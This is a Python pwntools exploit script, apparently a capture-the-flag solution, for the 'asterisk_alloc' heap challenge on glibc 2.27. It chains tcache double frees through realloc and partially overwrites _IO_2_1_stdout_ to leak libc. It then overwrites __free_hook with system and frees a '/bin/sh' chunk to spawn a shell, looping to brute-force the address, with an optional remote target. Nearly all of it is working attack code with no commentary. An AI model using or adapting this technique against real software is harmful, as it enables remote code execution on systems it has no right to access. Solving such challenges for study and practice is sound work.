#! /usr/bin/env python3
from pwn import *
import struct

arch = 64
challenge = './asterisk_alloc'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.27.so')

# local = 1
# if local:
#     p = process(challenge)
# else:
#     p = remote('node4.buuoj.cn', '25468')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice: ')

def malloc(size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.send(content)

def calloc(size, content):
    eat()
    p.sendline('2')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.send(content)

def realloc(size, content):
    eat()
    p.sendline('3')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.send(content)

def delete(lett):
    eat()
    p.sendline('4')
    p.recvuntil('Which: ')
    p.sendline(lett)

while True:
    arch = 64
    challenge = './asterisk_alloc'

    context.os = 'linux'
    context.log_level = 'debug'
    if arch == 64:
        context.arch = 'amd64'
    if arch == 32:
        context.arch = 'i386'
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(challenge)
    libc = ELF('libc-2.27.so')

    local = 1
    if local:
        p = process(challenge)
    else:
        p = remote('node4.buuoj.cn', '25468')
    # 2.27 可以直接 free 两次
    # realloc 不合并 tcache ?
    realloc(0x10,'1')
    realloc('0','')
    realloc(0x80,'1')
    realloc('0','')
    realloc(0x20,'1')# 防止 top
    realloc('0','')

    realloc(0x80,'1')
    for i in range(7):
        delete('r')
    realloc('0','')# 进 unsorted

    realloc(0x10,'1')
    _IO_2_1_stdout_ = libc.symbols["_IO_2_1_stdout_"]
    log.success('_IO_2_1_stdout_: ' + hex(_IO_2_1_stdout_))
    realloc(0xa0,b'1'*0x10 + p64(0) + p64(0x21) + p16(_IO_2_1_stdout_ & 0xffff))
    realloc('0','')

    realloc(0x80,b'1')
    realloc('0','')
    debug()
    try:
        realloc(0x80,p64(0xfbad1800)+p64(0)*3+b'\x58')
        libc.address = u64(p.recv(8)) - libc.symbols["_IO_file_jumps"]
        log.success("libc.address: " + hex(libc.address))
        free_hook = libc.symbols["__free_hook"]
        log.success("free_hook: "+hex(free_hook))
        system_addr = libc.sym['system']
        log.success('system_addr: ' + hex(system_addr))
        realloc('-1','')

        realloc(0xc0, '1')
        realloc('0', '')
        realloc(0xd0, '1')
        realloc('0', '')
        realloc(0xe0, '1')  # 防止 top
        realloc('0', '')

        realloc(0xd0, '1')
        for i in range(7):
            delete('r')

        realloc('0','')# 进 unsorted

        realloc(0xc0, '1')
        realloc(0x1a0, b'1' * 0xc0 + p64(0) + p64(0x21) + p64(free_hook))
        realloc('0', '')

        realloc(0xd0, b'1')
        realloc('0', '')

        realloc(0xd0, p64(system_addr))
        malloc(0x8, b'/bin/sh\x00')
        delete('m')

    except EOFError:
        # p.close()
        continue
    else:
        p.interactive()
        break
